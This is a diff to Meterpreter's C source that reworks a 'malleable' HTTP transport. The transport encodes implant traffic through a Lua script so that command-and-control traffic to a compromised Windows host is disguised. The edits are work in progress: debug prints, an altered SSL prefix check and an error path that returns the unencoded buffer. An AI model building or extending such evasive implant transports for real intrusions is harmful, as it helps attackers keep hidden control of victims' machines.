@@ -37,7 +37,7 @@ PUCHAR malleableEncode(LPVOID buffer, DWORD* size)
 	LONG result = ERROR_SUCCESS;
 	if (buffer == NULL){
 		dprintf("[MALLEABLE-ENCODE] Buffer reference was NULL!");
-		result = ERROR_MALLEABLE_BUFFER_NULL; // TODO real error code 
+		result = ERROR_MALLEABLE_BUFFER_NULL; 
 	}
 	if (!strcmp(luaScript, "")){
 		dprintf("[MALLEABLE-ENCODE] LUA script not set yet");
@@ -99,7 +99,10 @@ PUCHAR malleableEncode(LPVOID buffer, DWORD* size)
 	}
 
 	dprintf("[MALLEABLE-ENCODE] Malleable encode error end");
-	return NULL;
+	return buffer; /* Need to check if this breaks things because we have byte code returned as puchar. 
+				   Maybe we want this to break things and not establish a connection at all if malleable fails
+				   (and have a fallback to another transport (if available)*/ 
+
 }
 
 LPBYTE malleableDecode(LPVOID buffer, DWORD* size)
@@ -399,7 +402,7 @@ static BOOL send_request_winhttp_malleable(HttpTransportContext* ctx, HANDLE hRe
 		encodedBuffer = malleableEncode(buffer, &size);
 		//malleableEncode(buffer, &size);
 		dprintf("[WINHTTP MALLEABLE] Buffer address end: %x", buffer);
-		dprintf("[WINHTTP MALLEABLE] -------Sending out request. Size: %i. Buffer: %s", size, buffer);
+		dprintf("[WINHTTP MALLEABLE] -------Sending out request. Size: %i. Buffer: %s", size, encodedBuffer);
 		dprintf("[WINHTTP MALLEABLE] -------Sending out request. Strlen: %i", strlen(encodedBuffer));
 		result = WinHttpSendRequest(hReq, NULL, 0, encodedBuffer, size, size, 0); // TODO nach hier noch fehler drinnen
 		SAFE_FREE(encodedBuffer);
@@ -1350,7 +1353,7 @@ Transport* transport_create_http_malleable(MetsrvTransportHttp* config, LPDWORD 
 	{
 		ctx->proxy_pass = _wcsdup(config->proxy.password);
 	}
-	ctx->ssl = wcsncmp(config->common.url, L"https", 5) == 0;
+	ctx->ssl = wcsncmp(config->common.url, L"httpms", 5) == 0;
 	//dprintf("[TIMOHELP] 108 custom_headers hello? %x", config->custom_headers);
 	if (config->custom_headers[0])
 	{
@@ -1392,6 +1395,7 @@ Transport* transport_create_http_malleable(MetsrvTransportHttp* config, LPDWORD 
 	transport->timeouts.retry_total = config->common.retry_total;
 	transport->timeouts.retry_wait = config->common.retry_wait;
 	transport->type = ctx->ssl ? METERPRETER_TRANSPORT_HTTPS_MALLEABLE : METERPRETER_TRANSPORT_HTTPS_MALLEABLE;
+	dprintf("[TIMOHELP] transport->type ssl? %i", transport->type);
 	dprintf("[TIMOHELP] 110.1");
 	CHARTYPE modifiedUrl[URL_SIZE];
 	dprintf("[TIMOHELP] 110.1.1");
